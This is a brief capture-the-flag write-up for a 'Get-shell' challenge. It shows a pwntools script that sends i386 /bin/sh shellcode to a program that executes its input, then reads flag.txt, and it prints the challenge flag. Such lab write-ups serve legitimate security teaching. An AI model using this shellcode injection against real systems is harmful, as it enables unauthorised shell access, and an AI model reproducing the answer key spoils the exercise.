## Problem: Get-shell

Can you somehow spawn a shell and get the flag present at flag.txt?

## Hint: 
The program executes any input you give. If you give a shellcode as an input, it would execute it to give you access to the shell.

## Explanation:

We can run any assembly code using this program. We get the shellcode for getting /bin/sh (shell access) using this script:

```
from pwn import *

s = ssh(host='', user='', password="")
sh = s.process('script', cwd='/')

sh.sendlineafter('!\n', asm(shellcraft.i386.linux.sh()))
sh.interactive()

$ cat flag.txt
```

Flag: `lakshya_CTF{5h3llc0d3d}`
